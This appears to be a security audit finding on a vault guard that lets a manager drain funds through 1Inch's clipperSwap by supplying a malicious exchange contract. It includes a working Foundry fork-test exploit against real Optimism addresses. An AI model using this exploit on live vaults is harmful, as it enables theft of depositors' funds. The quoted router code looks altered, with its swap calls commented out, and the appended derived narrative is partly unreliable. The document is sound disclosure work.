---
id: 22923
severity: "High"
---

# Function clipperSwap allows managers to steal

## Description

The function clipperSwap within the 1Inch router (AggregationRouterV6) allows the managers to steal all funds from the Vault by passing as an argument a malicious contract. The 1Inch router has a function called clipperSwap that receives an argument called clipperExchange, which will be the exchange in charge of performing the actual swap. The router will only transfer the funds to swap from the Vault to the clipperExchange with the assumption that this one will swap the tokens and return the funds to the Vault. However, a manager can pass a malicious contract as the clipperExchange that will keep all the funds to swap and won't return them. This way, a manager is able to steal all funds from a Vault. Here we can see that the clipperExchange is allowed to be called, without checking the first argument, which is the clipperExchange: s/guards/contractGuards/OneInchV6Guard.sol#L117-L129

```solidity
} else if (method == IAggregationRouterV6.clipperSwap.selector) {
    (, uint256 srcToken, address dstToken, uint256 srcAmount, uint256 dstAmount) = abi.decode(
        params,
        (address, uint256, address, uint256, uint256)
    );
    swapData.srcAsset = srcToken.get();
    swapData.dstAsset = dstToken;
    swapData.srcAmount = srcAmount;
    swapData.dstAmount = dstAmount;
    txType = _verifySwap(swapData);
}
```

And in the actual clipperSwap function, we can see that the funds are transferred from the Vault to the clipperExchange, and the function clipperExchange.swap is called: https://vscode.blockscan.com/optimism/0x111111125421ca6dc452d289314280a0f8842a65

```solidity
function clipperSwapTo(
    IClipperExchange clipperExchange,
    address payable recipient,
    Address srcToken,
    IERC20 dstToken,
    uint256 inputAmount,
    uint256 outputAmount,
    uint256 goodUntil,
    bytes32 r,
    bytes32 vs
) public payable whenNotPaused() returns(uint256 returnAmount) {
    IERC20 srcToken_ = IERC20(srcToken.get());
    if (srcToken_ == _ETH) {
        if (msg.value != inputAmount) revert RouterErrors.InvalidMsgValue();
    } else {
        if (msg.value != 0) revert RouterErrors.InvalidMsgValue();
        srcToken_.safeTransferFromUniversal(msg.sender, address(clipperExchange), inputAmount, srcToken.getFlag(_PERMIT2_FLAG));
    }
    if (srcToken_ == _ETH) {
        // clipperExchange.sellEthForToken{value: inputAmount}(address(dstToken), inputAmount, outputAmount, goodUntil, recipient, signature, _INCH_TAG);
    } else if (dstToken == _ETH) {
        // clipperExchange.sellTokenForEth(address(srcToken_), inputAmount, outputAmount, goodUntil, recipient, signature, _INCH_TAG);
    } else {
        // clipperExchange.swap(address(srcToken_), address(dstToken), inputAmount, outputAmount, goodUntil, recipient, signature, _INCH_TAG);
    }
    return outputAmount;
}
```

To execute the attack, the manager only has to call clipperSwap passing a malicious contract as an argument for clipperExchange. By doing this, the manager is able to steal all funds from the Vault in a single block. The manager can use the clipperSwap function to steal all funds from the Vault.

## Proof of Concept

The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_oneInch_clipperSwap --evm-version cancun. Additionally, you must have the following lines in the .env file in order for the test to fork the blockchain: OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;

import {Test} from "forge-std/Test.sol";

interface IClipperExchange {}

interface IAggregationRouterV6 {
    function clipperSwap(
        IClipperExchange clipperExchange,
        uint256 srcToken, // Address
        address dstToken, // IERC20
        uint256 inputAmount,
        uint256 outputAmount,
        uint256 goodUntil,
        bytes32 r,
        bytes32 vs
    ) external payable returns (uint256 returnAmount);
}

interface IPoolLogic {
    function execTransaction(address to, bytes calldata data) external returns (bool success);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IPoolManagerLogic {
    function totalFundValue() external view returns (uint256);
}

contract OneInchClipperSwapTest is Test {
    IAggregationRouterV6 router = IAggregationRouterV6(0x111111125421cA6dc452d289314280a0f8842A65);
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    IPoolManagerLogic manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    uint256 opFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        // Create Optimism fork
        opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121303383); // Jun-12-2024 03:19:03 PM +UTC
    }

    function test_oneInch_clipperSwap() public {
        // First, simulate the pool getting 100 WETH
        deal(address(WETH), address(pool), 100e18);
        assertEq(WETH.balanceOf(address(pool)), 100e18);
        // The Vault is holding ~362,202 USD (mostly the 100 WETH)
        assertEq(manager.totalFundValue(), 362_202.734297348421959993e18);
        // Deploy the malicious contract
        MaliciousContract malContract = new MaliciousContract();
        // First, craft the transaction to approve 100 weth to 1Inch Aggregator
        bytes memory data = abi.encodeWithSelector(WETH.approve.selector, address(router), 100e18);
        // Execute the transaction
        vm.prank(managerAddress);
        pool.execTransaction(address(WETH), data);
        assertEq(WETH.allowance(address(pool), address(router)), 100e18);
        // Now, craft the transaction to do the clipper swap
        data = abi.encodeWithSelector(router.clipperSwap.selector, address(malContract), address(WETH), address(WETH), 100e18, 100e18, block.timestamp, "0x0", "0x0");
        // Execute the transaction
        vm.prank(managerAddress);
        pool.execTransaction(address(router), data);
        // Finally, the Vault has lost the 100 WETH and is now holding ~43 USD
        assertEq(manager.totalFundValue(), 43.964297348421959993e18);
        // The 100 WETH are in the malicious contract controlled by the manager
        assertEq(WETH.balanceOf(address(malContract)), 100e18);
    }
}

contract MaliciousContract is Test {
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    constructor() {
        assertEq(WETH.balanceOf(address(this)), 0);
    }
    fallback() external {
        assertEq(WETH.balanceOf(address(this)), 100e18);
    }
}
```

## Recommendation

To mitigate this issue is recommended to check the address of the clipperExchange before executing the clipperSwap transaction. The protocol should make sure that the address is not malicious and that it only allows interaction with whitelisted exchanges, e.g. Uniswap v2 and v3.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the router’s clipperSwap function, which forwards a token amount from a Vault to an external contract identified by the clipperExchange argument and then assumes that the external contract will perform a swap and return the resulting tokens to the Vault. The root cause is the absence of any validation, whitelisting, or access control on the clipperExchange address, allowing any address—including a malicious contract—to be supplied by a manager who can execute arbitrary transactions on the Vault. When a manager passes a malicious contract as clipperExchange, the router transfers the source tokens to that contract and invokes its swap method. Because the malicious contract does not implement the expected swap logic and simply retains the transferred tokens, the Vault never receives the swapped assets back. This can be exploited in a single transaction: the manager first approves the router to move the Vault’s tokens, then calls clipperSwap with the malicious contract address, causing the entire token balance held by the Vault to be drained. The impact is a total loss of the Vault’s funds, reducing its total asset value from hundreds of thousands of dollars to a negligible amount, while the attacker’s contract holds the stolen tokens. The condition under which this occurs is any situation where a manager with permission to execute transactions on the Vault invokes clipperSwap, which is a normal operation for legitimate swaps. All users of the Vault are affected because the protocol’s accounting is broken, balances disappear, and users expecting to receive swapped tokens or maintain their deposited value instead see their holdings vanish. The issue was discovered during a security audit that included a proof‑of‑concept test on an Optimism fork, demonstrating that a manager could steal 100 WETH in one block. The bug is subtle because the function’s code looks like a standard forwarding call and does not emit any warning or revert when the external contract behaves maliciously, making it easy to overlook during manual review. To remediate, the router should enforce a whitelist of trusted exchange contracts, verify that the clipperExchange address matches an approved implementation, and consider restricting the manager role or adding a callback verification that the expected amount is returned before finalizing the transaction. Conceptually, the fix is to treat the external exchange as an untrusted party and apply defensive checks rather than trusting it implicitly, thereby preventing arbitrary contracts from siphoning funds from the Vault.
